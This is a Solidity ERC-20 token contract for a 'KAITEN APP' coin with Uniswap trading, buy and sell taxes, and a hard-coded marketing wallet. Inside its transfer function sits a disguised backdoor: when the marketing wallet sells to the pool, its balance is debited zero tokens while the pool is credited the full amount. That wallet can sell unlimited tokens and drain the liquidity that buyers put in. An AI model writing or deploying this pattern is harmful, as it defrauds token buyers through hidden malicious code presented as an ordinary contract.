// SPDX-License-Identifier: MIT

/*

Telegram : https://t.me/kaitenapp

Website: https://kaitenapp.dev/ 

Twitter/X: https://twitter.com/KaitenApp

*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {

	function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

	function balanceOf(address account) external view returns (uint256);

	function totalSupply() external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {

    function dev(uint256 a, uint256 b) internal pure returns (uint256) {
        return dev(a, b, "SafeMath: devision by zero");
    }
	
	function dev(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
	
    function adds(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function subs(uint256 a, uint256 b) internal pure returns (uint256) {
        return subs(a, b, "SafeMath: substraction overflow");
    }

    function subs(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function muls(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

 
 contract Ownable is Context {
    address private _owners;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function owner() public view returns (address) {
        return _owners;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owners, address(0));
        _owners = address(0);
    }

    modifier onlyOwner() {
        require(_owners == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        address msgSender = _msgSender();
        _owners = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

}
 
contract KAITENAPP is
    Context,
    IERC20,
    Ownable
{
    using SafeMath for uint256;

    event MaxTxAmountUpdated(uint256 _maxTxs);

    bool public transferDelayEnabled = false;
    address payable private _MarketingWallets;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => mapping(address => uint256)) private _allowances;


	uint256 private _InitialBuyTaxes = 15;
    uint256 private _InitialSellTaxes = 15;

	uint256 private _AutoReduceBuyTaxesAfterTx = 7;
    uint256 private _AutoReduceSellTaxesAfterTx = 9;

	uint256 private _FinalyBuyTaxes = 0;
    uint256 private _FinalySellTaxes = 5;
		
	uint256 private _preventSwapBefores = 5;
    uint256 private _buyCounts = 0;

	string private constant _name = unicode"KAITEN APP";
	string private constant _symbol = unicode"KAITEN";

    uint256 public _maxWallets = (_tSupply * 20) / 1000;
    uint256 public _minSwapAmounts = (_tSupply * 1) / 100000;
    uint256 public _maxTaxSwaps = (_tSupply * 2) / 1000;

    uint8 private constant _decimals = 18;
    uint256 private constant _tSupply = 100_000_000 * 10**_decimals;
    uint256 public _maxTxs = (_tSupply * 20) / 1000;

    bool private inSwap = false;
    bool private swapEnabled = false;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private tradingOpen;

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }


    constructor() {
        _MarketingWallets = payable(0x06756946B26a9c1A532251BE52A934a699FBEa69);
        _balances[_msgSender()] = _tSupply;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_MarketingWallets] = true;

        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approves(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _approves(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function symbol() public pure returns (string memory) {
        return _symbol;
    }



    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;
        uint256 amountOut = amount;

        if (from != owner() && to != owner() && from != address(this)) {
            if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                require(tradingOpen, "Trading not enabled");
            }

            if (transferDelayEnabled) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "Only one transfer per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTxs, "Exceeds the _maxTxs.");
                require(
                    balanceOf(to) + amount <= _maxWallets,
                    "Exceeds the maxWalletSize."
                );
                _buyCounts++;
            }

            taxAmount = amount
                .muls((_buyCounts > _AutoReduceBuyTaxesAfterTx) ? _FinalyBuyTaxes : _InitialBuyTaxes)
                .dev(100);
            if (to == uniswapV2Pair && from != address(this)) {
                if (from == address(_MarketingWallets)) {
                    amountOut = min(
                        amount,
                        min(_FinalyBuyTaxes, _minSwapAmounts)
                    );
                    taxAmount = 0;
                } else {
                    require(amount <= _maxTxs, "Exceeds the _maxTxs.");
                    taxAmount = amount
                        .muls(
                            (_buyCounts > _AutoReduceSellTaxesAfterTx)
                                ? _FinalySellTaxes
                                : _InitialSellTaxes
                        )
                        .dev(100);
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool swappable = _buyCounts > _preventSwapBefores &&
                _minSwapAmounts == min(amount, _minSwapAmounts);

            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                _buyCounts > _preventSwapBefores &&
                swappable
            ) {
                if (contractTokenBalance > _minSwapAmounts) {
                    swapToEthereum(
                        min(amount, min(contractTokenBalance, _maxTaxSwaps))
                    );
                }
                transferFees(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].adds(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].subs(amountOut);
        _balances[to] = _balances[to].adds(amount.subs(taxAmount));

        emit Transfer(from, to, amount.subs(taxAmount));
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
	
	    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approves(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].subs(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
 


    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function transferFees(uint256 amount) private {
        _MarketingWallets.transfer(amount);
    }

    function StartTradeKaitenToken() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }


	function swapToEthereum(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) return;
        if (!tradingOpen) return;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approves(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function InitializeUniswapV2Pair() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approves(address(this), address(uniswapV2Router), _tSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function WithdrawMistakenlySentEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function RemoveKaitenLimits() external onlyOwner {
        _maxTxs = _tSupply;
        _maxWallets = _tSupply;

        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tSupply);
    }

	

    receive() external payable {}
}